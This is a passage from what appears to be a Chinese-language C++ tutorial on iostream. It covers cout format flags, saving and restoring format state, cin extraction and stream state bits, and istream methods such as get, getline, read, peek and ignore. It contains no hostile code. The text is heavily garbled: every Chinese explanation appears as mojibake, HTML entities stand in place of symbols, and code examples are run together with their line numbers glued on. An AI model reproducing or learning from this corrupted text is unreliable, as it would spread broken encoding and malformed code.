ä¸å¼ºåˆ¶æ˜¾ç¤ºï¼ˆé»˜è®¤ï¼‰ã€‚ 12345std::cout &lt;&lt; std::fixed &lt;&lt; std::setprecision(2);std::cout &lt;&lt; &quot;Default: &quot; &lt;&lt; 12.0 &lt;&lt; std::endl; // å¯èƒ½è¾“å‡º 12 (å–å†³äºå®ç°)std::cout &lt;&lt; std::showpoint;std::cout &lt;&lt; &quot;Showpoint: &quot; &lt;&lt; 12.0 &lt;&lt; std::endl; // è¾“å‡º 12.00std::cout &lt;&lt; std::noshowpoint; æ˜¾ç¤ºæ­£å· (showpos, noshowpos): showpos: å¯¹äºéè´Ÿæ•°ï¼Œåœ¨å‰é¢æ˜¾ç¤º + å·ã€‚ noshowpos: ä¸æ˜¾ç¤ºæ­£å·ï¼ˆé»˜è®¤ï¼‰ã€‚ 1234std::cout &lt;&lt; +10 &lt;&lt; &quot; &quot; &lt;&lt; -10 &lt;&lt; std::endl; // è¾“å‡º 10 -10std::cout &lt;&lt; std::showpos;std::cout &lt;&lt; +10 &lt;&lt; &quot; &quot; &lt;&lt; -10 &lt;&lt; std::endl; // è¾“å‡º +10 -10std::cout &lt;&lt; std::noshowpos; å¸ƒå°”å€¼æ ¼å¼ (boolalpha, noboolalpha): boolalpha: å°† bool å€¼è¾“å‡ºä¸ºå­—ç¬¦ä¸² â€œtrueâ€ æˆ– â€œfalseâ€ã€‚ noboolalpha: å°† bool å€¼è¾“å‡ºä¸ºæ•´æ•° 1 æˆ– 0ï¼ˆé»˜è®¤ï¼‰ã€‚ 12345bool flag = true;std::cout &lt;&lt; &quot;Default bool: &quot; &lt;&lt; flag &lt;&lt; std::endl; // è¾“å‡º 1std::cout &lt;&lt; std::boolalpha;std::cout &lt;&lt; &quot;Boolalpha: &quot; &lt;&lt; flag &lt;&lt; std::endl; // è¾“å‡º truestd::cout &lt;&lt; std::noboolalpha; 7. è®¾ç½®æ ¼å¼ (setf())setf() æ˜¯ä¸€ä¸ªæ›´åº•å±‚çš„è®¾ç½®æ ¼å¼æ ‡å¿—çš„æ–¹æ³•ã€‚å®ƒæœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼š fmtflags setf(fmtflags flags): è®¾ç½® flags ä¸­æŒ‡å®šçš„ä½ã€‚ä¾‹å¦‚ cout.setf(ios_base::showpos)ã€‚ fmtflags setf(fmtflags flags, fmtflags mask): å…ˆæ¸…é™¤ mask ä¸­æŒ‡å®šçš„ä½ï¼Œç„¶åè®¾ç½® flags ä¸­æŒ‡å®šçš„ä½ã€‚è¿™ç”¨äºè®¾ç½®äº’æ–¥çš„æ ‡å¿—ç»„ï¼Œå¦‚å¯¹é½æ–¹å¼ (adjustfield) æˆ–æµ®ç‚¹æ•°æ ¼å¼ (floatfield)ã€‚ä¾‹å¦‚ cout.setf(ios_base::left, ios_base::adjustfield)ã€‚ è™½ç„¶ setf() æä¾›äº†å®Œå…¨çš„æ§åˆ¶ï¼Œä½†ä½¿ç”¨æ“çºµç¬¦é€šå¸¸æ›´æ˜“è¯»ã€æ›´æ–¹ä¾¿ã€‚ ä¿å­˜å’Œæ¢å¤æ ¼å¼çŠ¶æ€: æœ‰æ—¶ä½ å¯èƒ½æƒ³ä¸´æ—¶æ”¹å˜æ ¼å¼ï¼Œä¹‹åå†æ¢å¤ã€‚å¯ä»¥ä¿å­˜ flags() å’Œ precision() çš„å€¼ï¼Œä¹‹åå†ç”¨ flags(old_flags) å’Œ precision(old_precision) æ¢å¤ã€‚ 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;iomanip&gt;int main() &#123; // ä¿å­˜å½“å‰æ ¼å¼çŠ¶æ€ std::ios_base::fmtflags original_flags = std::cout.flags(); std::streamsize original_precision = std::cout.precision(); // è¿›è¡Œä¸€äº›æ ¼å¼åŒ–è¾“å‡º std::cout &lt;&lt; std::fixed &lt;&lt; std::setprecision(2) &lt;&lt; std::showpos; std::cout &lt;&lt; &quot;Formatted: &quot; &lt;&lt; 12.345 &lt;&lt; &quot; &quot; &lt;&lt; -6.7 &lt;&lt; std::endl; // æ¢å¤åŸå§‹æ ¼å¼çŠ¶æ€ std::cout.flags(original_flags); std::cout.precision(original_precision); std::cout &lt;&lt; &quot;Restored: &quot; &lt;&lt; 12.345 &lt;&lt; &quot; &quot; &lt;&lt; -6.7 &lt;&lt; std::endl; return 0;&#125; é€šè¿‡ç»„åˆä½¿ç”¨è¿™äº›æ ¼å¼åŒ–å·¥å…·ï¼Œå¯ä»¥ç²¾ç¡®åœ°æ§åˆ¶ cout è¾“å‡ºæ•°æ®çš„å¤–è§‚ã€‚ 17.3 ä½¿ç”¨ cin è¿›è¡Œè¾“å…¥std::cin æ˜¯ C++ æ ‡å‡†åº“ &lt;iostream&gt; ä¸­é¢„å®šä¹‰çš„ä¸€ä¸ª istream ç±»çš„å…¨å±€å¯¹è±¡ï¼Œé€šå¸¸è¿æ¥åˆ°æ ‡å‡†è¾“å…¥è®¾å¤‡ï¼ˆå¦‚é”®ç›˜ï¼‰ã€‚å®ƒæ˜¯ C++ ä¸­è·å–ç”¨æˆ·è¾“å…¥çš„ä¸»è¦æ–¹å¼ã€‚ cin æœ€å¸¸è§çš„ç”¨æ³•æ˜¯é…åˆæå–è¿ç®—ç¬¦ (&gt;&gt;) ä½¿ç”¨ã€‚è¿™ä¸ªè¿ç®—ç¬¦ä¹Ÿè¢«é‡è½½ä»¥æ¥å—å„ç§åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆint, float, double, char ç­‰ï¼‰ä»¥åŠ std::string å’Œ C é£æ ¼å­—ç¬¦æ•°ç»„ã€‚ cin &gt;&gt; çš„å·¥ä½œæ–¹å¼: è·³è¿‡ç©ºç™½: &gt;&gt; è¿ç®—ç¬¦é»˜è®¤ä¼šè·³è¿‡è¾“å…¥æµä¸­æ‰€æœ‰å‰å¯¼çš„ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰ã€‚ è¯»å–å’Œè½¬æ¢: å®ƒä¼šæ ¹æ®ç›®æ ‡å˜é‡çš„ç±»å‹ï¼Œä»ç¼“å†²åŒºè¯»å–éç©ºç™½å­—ç¬¦ï¼Œå¹¶å°è¯•å°†è¿™äº›å­—ç¬¦è½¬æ¢ä¸ºç›®æ ‡ç±»å‹çš„å€¼ã€‚ åœæ­¢è¯»å–: è¯»å–ä¼šåœ¨é‡åˆ°ä¸é€‚åˆç›®æ ‡ç±»å‹çš„å­—ç¬¦ï¼ˆä¾‹å¦‚ï¼Œè¯»å– int æ—¶é‡åˆ°å­—æ¯ï¼‰æˆ–ä¸‹ä¸€ä¸ªç©ºç™½å­—ç¬¦æ—¶åœæ­¢ã€‚ å­˜å‚¨å€¼: æˆåŠŸè½¬æ¢çš„å€¼è¢«å­˜å‚¨åœ¨ç›®æ ‡å˜é‡ä¸­ã€‚ ç•™ä¸‹åˆ†éš”ç¬¦: å¯¼è‡´è¯»å–åœæ­¢çš„é‚£ä¸ªä¸åˆé€‚çš„å­—ç¬¦æˆ–ç©ºç™½å­—ç¬¦ä¼šç•™åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ï¼Œç­‰å¾…ä¸‹ä¸€æ¬¡è¯»å–ã€‚ ç¤ºä¾‹: 123456789101112131415161718192021222324#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; int age; double price; std::string name; char initial; std::cout &lt;&lt; &quot;Enter age, price, initial, and name (separated by spaces): &quot;; // Example input: 30 99.99 J Doe std::cin &gt;&gt; age &gt;&gt; price &gt;&gt; initial &gt;&gt; name; // å¯ä»¥é“¾æ¥è¯»å– std::cout &lt;&lt; &quot;\\n--- You entered ---&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; // Output: 30 std::cout &lt;&lt; &quot;Price: &quot; &lt;&lt; price &lt;&lt; std::endl; // Output: 99.99 std::cout &lt;&lt; &quot;Initial: &quot; &lt;&lt; initial &lt;&lt; std::endl; // Output: J std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; name &lt;&lt; std::endl; // Output: Doe (åªè¯»å–åˆ°ç©ºæ ¼å‰) // æ­¤æ—¶ï¼Œè¾“å…¥ç¼“å†²åŒºä¸­å¯èƒ½è¿˜ç•™æœ‰ &quot; Doe&quot; åé¢çš„æ¢è¡Œç¬¦ return 0;&#125; 17.3.1 cin &gt;&gt; å¦‚ä½•æ£€æŸ¥è¾“å…¥cin &gt;&gt; è¡¨è¾¾å¼æœ¬èº«ä¼šè¿”å› cin å¯¹è±¡ (istream&amp;)ã€‚C++ å…è®¸åœ¨éœ€è¦å¸ƒå°”å€¼çš„åœ°æ–¹ï¼ˆå¦‚ if æˆ– while æ¡ä»¶ï¼‰ä½¿ç”¨æµå¯¹è±¡ã€‚å½“æµå¯¹è±¡è¢«ç”¨ä½œæ¡ä»¶æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥æµçš„**çŠ¶æ€ (state)**ã€‚å¦‚æœæµå¤„äºâ€œè‰¯å¥½â€çŠ¶æ€ï¼ˆæ²¡æœ‰å‘ç”Ÿé”™è¯¯ï¼‰ï¼Œæ¡ä»¶ä¸º trueï¼›å¦‚æœæµå‘ç”Ÿé”™è¯¯ï¼ˆå¦‚è¯»å–å¤±è´¥ã€åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼‰ï¼Œæ¡ä»¶ä¸º falseã€‚ è¿™ä½¿å¾—å¯ä»¥ç¼–å†™å¦‚ä¸‹å¾ªç¯ï¼š 1234567891011121314#include &lt;iostream&gt;int main() &#123; int value; std::cout &lt;&lt; &quot;Enter numbers (non-number to quit): &quot;; // å½“ cin &gt;&gt; value æˆåŠŸè¯»å–ä¸€ä¸ªæ•´æ•°æ—¶ï¼Œcin çŠ¶æ€è‰¯å¥½ï¼Œå¾ªç¯ç»§ç»­ // å½“è¾“å…¥éæ•°å­—å¯¼è‡´è¯»å–å¤±è´¥æ—¶ï¼Œcin è¿›å…¥ fail çŠ¶æ€ï¼Œå¾ªç¯ç»ˆæ­¢ while (std::cin &gt;&gt; value) &#123; std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Enter next number: &quot;; &#125; std::cout &lt;&lt; &quot;Input terminated or failed.&quot; &lt;&lt; std::endl; return 0;&#125; 17.3.2 æµçŠ¶æ€istream ç±»ï¼ˆä»¥åŠ ostream å’Œ iosï¼‰å†…éƒ¨ç»´æŠ¤ä¸€ç»„çŠ¶æ€ä½ (state flags) æ¥è¡¨ç¤ºæµçš„å½“å‰çŠ¶æ€ã€‚è¿™äº›çŠ¶æ€ä½å®šä¹‰åœ¨ ios_base ç±»ä¸­ï¼Œç±»å‹ä¸º iostate (ä¸€ç§ä½æ©ç ç±»å‹)ã€‚ ä¸»è¦çš„çŠ¶æ€ä½æœ‰ï¼š goodbit: è¡¨ç¤ºæµå¤„äºæ­£å¸¸çŠ¶æ€ï¼Œæ²¡æœ‰å‘ç”Ÿé”™è¯¯ã€‚å€¼ä¸º 0ã€‚ eofbit: è¡¨ç¤ºå·²åˆ°è¾¾è¾“å…¥æµçš„**æœ«å°¾ (End Of File)**ã€‚å½“å°è¯•ä»æ–‡ä»¶æœ«å°¾æˆ–å…³é—­çš„è¾“å…¥æµè¯»å–æ—¶è®¾ç½®ã€‚ failbit: è¡¨ç¤ºå‘ç”Ÿå¯æ¢å¤çš„æ ¼å¼é”™è¯¯ã€‚é€šå¸¸æ˜¯å› ä¸ºè¾“å…¥çš„æ•°æ®æ ¼å¼ä¸æœŸæœ›è¯»å–çš„ç±»å‹ä¸åŒ¹é…ï¼ˆä¾‹å¦‚ï¼ŒæœŸæœ› int ä½†è¾“å…¥äº†å­—æ¯ï¼‰ã€‚è®¾ç½® failbit åï¼Œåç»­çš„ I/O æ“ä½œé€šå¸¸ä¼šå¤±è´¥ï¼Œç›´åˆ°æµçŠ¶æ€è¢«æ¸…é™¤ã€‚ badbit: è¡¨ç¤ºå‘ç”Ÿä¸å¯æ¢å¤çš„ä¸¥é‡é”™è¯¯ï¼Œå¯èƒ½æ¶‰åŠæµæœ¬èº«çš„æŸåæˆ–åº•å±‚ I/O æ“ä½œå¤±è´¥ï¼ˆä¾‹å¦‚ï¼Œè¯»å–ç£ç›˜æ—¶å‘ç”Ÿç¡¬ä»¶é”™è¯¯ï¼‰ã€‚ ä¸€ä¸ªæµå¯èƒ½åŒæ—¶è®¾ç½®äº†å¤šä¸ªçŠ¶æ€ä½ï¼ˆä¾‹å¦‚ï¼Œåœ¨æ–‡ä»¶æœ«å°¾å°è¯•è¯»å–å¤±è´¥å¯èƒ½åŒæ—¶è®¾ç½® eofbit å’Œ failbitï¼‰ã€‚ æ£€æŸ¥æµçŠ¶æ€çš„æˆå‘˜å‡½æ•°: good(): å¦‚æœæµçŠ¶æ€ä¸º goodbitï¼ˆå³æ‰€æœ‰é”™è¯¯ä½éƒ½æœªè®¾ç½®ï¼‰ï¼Œè¿”å› trueã€‚ eof(): å¦‚æœè®¾ç½®äº† eofbitï¼Œè¿”å› trueã€‚ fail(): å¦‚æœè®¾ç½®äº† failbit æˆ– badbitï¼Œè¿”å› trueã€‚è¿™æ˜¯æ£€æŸ¥è¯»å–æ“ä½œæ˜¯å¦å¤±è´¥çš„æœ€å¸¸ç”¨æ–¹æ³•ã€‚ bad(): å¦‚æœè®¾ç½®äº† badbitï¼Œè¿”å› trueã€‚ rdstate(): è¿”å›å½“å‰æ‰€æœ‰çŠ¶æ€ä½çš„ç»„åˆï¼ˆä¸€ä¸ª iostate å€¼ï¼‰ã€‚ operator bool(): é‡è½½çš„å¸ƒå°”è½¬æ¢è¿ç®—ç¬¦ã€‚å¦‚æœ fail() è¿”å› falseï¼Œåˆ™è½¬æ¢ä¸º trueï¼›å¦åˆ™è½¬æ¢ä¸º falseã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå¯ä»¥åœ¨ if(cin) æˆ– while(cin &gt;&gt; value) ä¸­ä½¿ç”¨æµå¯¹è±¡çš„åŸå› ã€‚ operator!(): é‡è½½çš„é€»è¾‘éè¿ç®—ç¬¦ã€‚å¦‚æœ fail() è¿”å› trueï¼Œåˆ™ !cin ä¸º trueã€‚ æ¸…é™¤æµçŠ¶æ€: å½“æµè¿›å…¥ failbit æˆ– badbit çŠ¶æ€åï¼Œåç»­çš„ I/O æ“ä½œé€šå¸¸ä¼šç«‹å³å¤±è´¥ã€‚ä¸ºäº†ç»§ç»­ä½¿ç”¨è¯¥æµï¼Œå¿…é¡»æ¸…é™¤é”™è¯¯çŠ¶æ€ã€‚ clear(iostate state = goodbit): é‡ç½®æµçš„çŠ¶æ€ä½ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ˆä¸å¸¦å‚æ•°æˆ–å‚æ•°ä¸º goodbitï¼‰ï¼Œå®ƒä¼šæ¸…é™¤æ‰€æœ‰é”™è¯¯ä½ (eofbit, failbit, badbit)ï¼Œä½¿æµæ¢å¤åˆ° good() çŠ¶æ€ã€‚ä¹Ÿå¯ä»¥ç”¨å®ƒæ¥è®¾ç½®ç‰¹å®šçš„çŠ¶æ€ä½ã€‚ ç¤ºä¾‹ï¼šå¤„ç†è¾“å…¥é”™è¯¯ 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;limits&gt; // for numeric_limitsint main() &#123; int number; std::cout &lt;&lt; &quot;Enter an integer: &quot;; while (!(std::cin &gt;&gt; number)) &#123; // å¦‚æœè¯»å–å¤±è´¥ (cin è¿”å› false) std::cout &lt;&lt; &quot;Invalid input. Please enter an integer: &quot;; // 1. æ¸…é™¤é”™è¯¯çŠ¶æ€ std::cin.clear(); // 2. ä¸¢å¼ƒç¼“å†²åŒºä¸­çš„é”™è¯¯è¾“å…¥ // è¯»å–å¹¶å¿½ç•¥ç›´åˆ°ä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦æˆ–ç¼“å†²åŒºç»“æŸçš„æ‰€æœ‰å­—ç¬¦ std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\\n&#x27;); &#125; std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; number &lt;&lt; std::endl; return 0;&#125; è¿™ä¸ªå¾ªç¯ä¼šä¸€ç›´è¦æ±‚ç”¨æˆ·è¾“å…¥ï¼Œç›´åˆ°æˆåŠŸè¯»å–ä¸€ä¸ªæ•´æ•°ä¸ºæ­¢ã€‚å…³é”®åœ¨äºè¯»å–å¤±è´¥åï¼Œå¿…é¡»å…ˆ clear() é”™è¯¯æ ‡å¿—ï¼Œç„¶å ignore() æ‰å¯¼è‡´é”™è¯¯çš„æ— æ•ˆè¾“å…¥ï¼Œå¦åˆ™ä¸‹ä¸€æ¬¡å¾ªç¯çš„ cin &gt;&gt; number è¿˜ä¼šå› ä¸ºåŒæ ·çš„åŸå› å¤±è´¥ã€‚ 17.3.3 å…¶ä»– istream ç±»æ–¹æ³•é™¤äº† &gt;&gt; è¿ç®—ç¬¦ï¼Œistream ç±»è¿˜æä¾›äº†å…¶ä»–ç”¨äºè¾“å…¥çš„æˆå‘˜å‡½æ•°ï¼Œå®ƒä»¬æä¾›äº†æ›´ç²¾ç»†çš„æ§åˆ¶ã€‚ 1. å•å­—ç¬¦è¾“å…¥: get()get() æœ‰å‡ ä¸ªç‰ˆæœ¬ç”¨äºè¯»å–å•ä¸ªå­—ç¬¦ï¼š int get(): è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼ˆå³ä½¿æ˜¯ç©ºç™½å­—ç¬¦ï¼‰ï¼Œå¹¶å°†å…¶ä½œä¸º int ç±»å‹è¿”å›ã€‚å¦‚æœåˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼Œè¿”å› EOF (ä¸€ä¸ªç‰¹æ®Šçš„è´Ÿæ•´æ•°å¸¸é‡ï¼Œå®šä¹‰åœ¨ &lt;iostream&gt; æˆ– &lt;cstdio&gt; ä¸­)ã€‚ istream&amp; get(char&amp; ch): è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼ˆå³ä½¿æ˜¯ç©ºç™½å­—ç¬¦ï¼‰ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ ch ä¸­ã€‚è¿”å› istream å¯¹è±¡çš„å¼•ç”¨ã€‚å¦‚æœè¯»å–å¤±è´¥ï¼ˆå¦‚åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼‰ï¼Œä¼šè®¾ç½® failbitã€‚ 123456789101112131415161718192021222324#include &lt;iostream&gt;int main() &#123; char ch; std::cout &lt;&lt; &quot;Enter characters (Ctrl+D/Ctrl+Z to end):&quot; &lt;&lt; std::endl; // ä½¿ç”¨ get(char&amp;) while (std::cin.get(ch)) &#123; // è¯»å–æˆåŠŸåˆ™å¾ªç¯ç»§ç»­ std::cout.put(ch); // é€ä¸ªè¾“å‡ºè¯»åˆ°çš„å­—ç¬¦ &#125; std::cout &lt;&lt; &quot;\\nEnd of input (using get(char&amp;)).\\n&quot;; std::cin.clear(); // æ¸…é™¤ eof çŠ¶æ€ä»¥ä¾¿ç»§ç»­æ¼”ç¤º std::cout &lt;&lt; &quot;\\nEnter characters again:&quot; &lt;&lt; std::endl; // ä½¿ç”¨ int get() int char_code; while ((char_code = std::cin.get()) != EOF) &#123; std::cout.put(static_cast&lt;char&gt;(char_code)); &#125; std::cout &lt;&lt; &quot;\\nEnd of input (using int get()).\\n&quot;; return 0;&#125; get() ä¸ä¼šè·³è¿‡ç©ºç™½å­—ç¬¦ã€‚ 2. å­—ç¬¦ä¸²è¾“å…¥: get() å’Œ getline()istream æä¾›äº†ç”¨äºè¯»å– C é£æ ¼å­—ç¬¦ä¸²ï¼ˆå­—ç¬¦æ•°ç»„ï¼‰çš„ get() å’Œ getline() ç‰ˆæœ¬ã€‚ istream&amp; get(char* s, streamsize n, char delim = &#39;\\n&#39;): ä»è¾“å…¥æµè¯»å–å­—ç¬¦ï¼Œå­˜å‚¨åˆ°å­—ç¬¦æ•°ç»„ s ä¸­ã€‚ æœ€å¤šè¯»å– n-1 ä¸ªå­—ç¬¦ï¼ˆä¸ºæœ«å°¾çš„ç©ºå­—ç¬¦ \\0 ç•™å‡ºç©ºé—´ï¼‰ã€‚ é‡åˆ°åˆ†éš”ç¬¦ delim æ—¶åœæ­¢è¯»å–ã€‚ åˆ†éš”ç¬¦ delim ä¼šè¢«ç•™åœ¨è¾“å…¥æµä¸­ï¼Œä¸ä¼šè¢«è¯»å–åˆ° s ä¸­ã€‚ æ€»æ˜¯åœ¨è¯»å–çš„å­—ç¬¦åºåˆ—æœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ \\0ã€‚ å¦‚æœå› ä¸ºè¯»å–äº† n-1 ä¸ªå­—ç¬¦è€Œåœæ­¢ï¼Œä¼šè®¾ç½® failbitã€‚ istream&amp; getline(char* s, streamsize n, char delim = &#39;\\n&#39;): ä¸ get() ç±»ä¼¼ï¼Œæœ€å¤šè¯»å– n-1 ä¸ªå­—ç¬¦ã€‚ é‡åˆ°åˆ†éš”ç¬¦ delim æ—¶åœæ­¢è¯»å–ã€‚ åˆ†éš”ç¬¦ delim ä¼šä»è¾“å…¥æµä¸­è¢«è¯»å–å¹¶ä¸¢å¼ƒï¼Œä¸ä¼šå­˜å‚¨åœ¨ s ä¸­ã€‚ æ€»æ˜¯åœ¨è¯»å–çš„å­—ç¬¦åºåˆ—æœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ \\0ã€‚ å¦‚æœå› ä¸ºè¯»å–äº† n-1 ä¸ªå­—ç¬¦è€Œåœæ­¢ï¼ˆåœ¨é‡åˆ°åˆ†éš”ç¬¦ä¹‹å‰ï¼‰ï¼Œä¼šè®¾ç½® failbitã€‚ ä¸»è¦åŒºåˆ«: getline() ä¼šè¯»å–å¹¶ä¸¢å¼ƒåˆ†éš”ç¬¦ï¼Œè€Œ get() ä¼šå°†åˆ†éš”ç¬¦ç•™åœ¨æµä¸­ã€‚ 123456789101112131415161718192021222324252627#include &lt;iostream&gt;int main() &#123; char line1[50]; char line2[50]; std::cout &lt;&lt; &quot;Enter line 1: &quot;; std::cin.getline(line1, 50); // è¯»å–æ•´è¡Œï¼Œä¸¢å¼ƒæ¢è¡Œç¬¦ std::cout &lt;&lt; &quot;Enter line 2: &quot;; std::cin.get(line2, 50); // è¯»å–æ•´è¡Œï¼Œæ¢è¡Œç¬¦ç•™åœ¨ç¼“å†²åŒº std::cout &lt;&lt; &quot;Line 1: &quot; &lt;&lt; line1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Line 2: &quot; &lt;&lt; line2 &lt;&lt; std::endl; // æ£€æŸ¥ get() ä¹‹åç¼“å†²åŒºçš„å†…å®¹ char next_char; std::cout &lt;&lt; &quot;Character after get(): &quot;; std::cin.get(next_char); // è¯»å–ç•™åœ¨ç¼“å†²åŒºçš„æ¢è¡Œç¬¦ if (next_char == &#x27;\\n&#x27;) &#123; std::cout &lt;&lt; &quot;&#x27;\\\\n&#x27;&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; next_char &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; &#125; return 0;&#125; æ³¨æ„: è¿™äº›æ˜¯ç”¨äº C é£æ ¼å­—ç¬¦ä¸²çš„ç‰ˆæœ¬ã€‚å¯¹äº std::string å¯¹è±¡ï¼Œåº”ä½¿ç”¨å…¨å±€çš„ getline(cin, str) å‡½æ•°ï¼ˆå¦‚ 16.1 èŠ‚æ‰€è¿°ï¼‰ã€‚ 17.3.4 å…¶ä»– istream æ–¹æ³• read(char* s, streamsize n): ä»æµä¸­è¯»å–ç²¾ç¡® n ä¸ªå­—èŠ‚ï¼Œå¹¶å­˜å‚¨åˆ°ä» s å¼€å§‹çš„å†…å­˜ä¸­ã€‚å®ƒä¸ä¼šåœ¨é‡åˆ°ç©ºå­—ç¬¦æˆ–åˆ†éš”ç¬¦æ—¶åœæ­¢ï¼Œä¹Ÿä¸ä¼šæ·»åŠ ç©ºå­—ç¬¦ã€‚ä¸»è¦ç”¨äºè¯»å–äºŒè¿›åˆ¶æ•°æ®ã€‚å¦‚æœè¯»å–çš„å­—èŠ‚æ•°å°‘äº nï¼ˆä¾‹å¦‚åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼‰ï¼Œä¼šè®¾ç½® eofbit å’Œ failbitã€‚ peek(): è¿”å›è¾“å…¥æµä¸­çš„ä¸‹ä¸€ä¸ªå­—ç¬¦çš„æ•´æ•°å€¼ï¼Œä½†ä¸ä»æµä¸­ç§»é™¤è¯¥å­—ç¬¦ã€‚å¦‚æœåˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼Œè¿”å› EOFã€‚å¯ç”¨äºåœ¨å®é™…è¯»å–å‰æŸ¥çœ‹ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚ gcount(): è¿”å›ä¸Šä¸€æ¬¡æœªæ ¼å¼åŒ–è¯»å–æ“ä½œï¼ˆå¦‚ get(), getline(), read()ï¼‰å®é™…è¯»å–çš„å­—ç¬¦æ•°ã€‚å¯¹äº &gt;&gt; è¿ç®—ç¬¦æ— æ•ˆã€‚ putback(char c): å°†å­—ç¬¦ c æ”¾å›è¾“å…¥æµä¸­ï¼Œä½¿å…¶æˆä¸ºä¸‹ä¸€ä¸ªè¢«è¯»å–çš„å­—ç¬¦ã€‚é€šå¸¸åªèƒ½æ”¾å›ä¸Šä¸€ä¸ªè¯»å–çš„å­—ç¬¦ã€‚ ignore(streamsize n = 1, int delim = EOF): è¯»å–å¹¶ä¸¢å¼ƒè¾“å…¥æµä¸­çš„å­—ç¬¦ã€‚ æœ€å¤šä¸¢å¼ƒ n ä¸ªå­—ç¬¦ã€‚ å¦‚æœåœ¨æ­¤ä¹‹å‰é‡åˆ°å¹¶è¯»å–äº†åˆ†éš”ç¬¦ delimï¼Œåˆ™åœæ­¢ä¸¢å¼ƒã€‚ åˆ†éš”ç¬¦ delim æœ¬èº«ä¹Ÿä¼šè¢«ä¸¢å¼ƒã€‚ å¸¸ç”¨äºæ¸…é™¤ç¼“å†²åŒºä¸­çš„æ— æ•ˆè¾“å…¥æˆ–è·³è¿‡ä¸éœ€è¦çš„éƒ¨åˆ†ã€‚ 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;limits&gt;int main() &#123; char buffer[10]; std::cout &lt;&lt; &quot;Enter some text (e.g., abcdefghij): &quot;; std::cin.read(buffer, 5); // è¯»å– 5 ä¸ªå­—èŠ‚åˆ° buffer std::cout &lt;&lt; &quot;Read &quot; &lt;&lt; std::cin.gcount() &lt;&lt; &quot; bytes: &quot;; std::cout.write(buffer, std::cin.gcount()) &lt;&lt; std::endl; // è¾“å‡ºè¯»å–çš„å†…å®¹ char next = std::cin.peek(); // æŸ¥çœ‹ä¸‹ä¸€ä¸ªå­—ç¬¦ std::cout &lt;&lt; &quot;Next char (peek): &#x27;&quot; &lt;&lt; static_cast&lt;char&gt;(next) &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; char actual_next; std::cin.get(actual_next); // å®é™…è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦ std::cout &lt;&lt; &quot;Actual next char (get): &#x27;&quot; &lt;&lt; actual_next &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; std::cin.putback(actual_next); // å°†å­—ç¬¦æ”¾å› std::cin.get(actual_next); // å†æ¬¡è¯»å– std::cout &lt;&lt; &quot;Read again after putback: &#x27;&quot; &lt;&lt; actual_next &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Ignoring rest of the line...&quot; &lt;&lt; std::endl; std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\\n&#x27;); // å¿½ç•¥åˆ°è¡Œå°¾ std::cout &lt;&lt; &quot;Enter a final character: &quot;; char final_char; std::cin &gt;&gt; final_char; // ç°åœ¨å¯ä»¥è¯»å–æ–°è¡Œçš„å­—ç¬¦äº† std::cout &lt;&lt; &quot;Final char: &quot; &lt;&lt; final_char &lt;&lt; std::endl; return 0;&#125; é€šè¿‡ç»„åˆä½¿ç”¨ cin &gt;&gt; å’Œè¿™äº› istream æˆå‘˜å‡½æ•°ï¼Œå¯ä»¥å®ç°çµæ´»å¤šæ ·çš„è¾“å…¥å¤„ç†é€»è¾‘ï¼Œå¹¶èƒ½æœ‰æ•ˆåœ°å¤„ç†è¾“å…¥é”™è¯¯ã€‚ 17.4 æ–‡ä»¶è¾“å…¥å’Œè¾“å‡ºé™¤äº†ä¸æ§åˆ¶å°è¿›è¡Œäº¤äº’ï¼ˆcin, coutï¼‰ï¼Œç¨‹åºç»å¸¸éœ€è¦ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®æˆ–å°†æ•°æ®å†™å…¥æ–‡ä»¶ã€‚C++ çš„ iostream åº“é€šè¿‡ &lt;fstream&gt; å¤´æ–‡ä»¶æä¾›äº†ç”¨äºæ–‡ä»¶ I/O çš„ç±»ã€‚ &lt;fstream&gt; å®šä¹‰äº†ä¸‰ä¸ªä¸»è¦çš„ç±»ï¼š ifstream (input file stream): ç»§æ‰¿è‡ª istreamï¼Œä¸“é—¨ç”¨äºä»æ–‡ä»¶è¯»å–æ•°æ®ã€‚ ofstream (output file stream): ç»§æ‰¿è‡ª ostreamï¼Œä¸“é—¨ç”¨äºå‘æ–‡ä»¶å†™å…¥æ•°æ®ã€‚ fstream: ç»§æ‰¿è‡ª 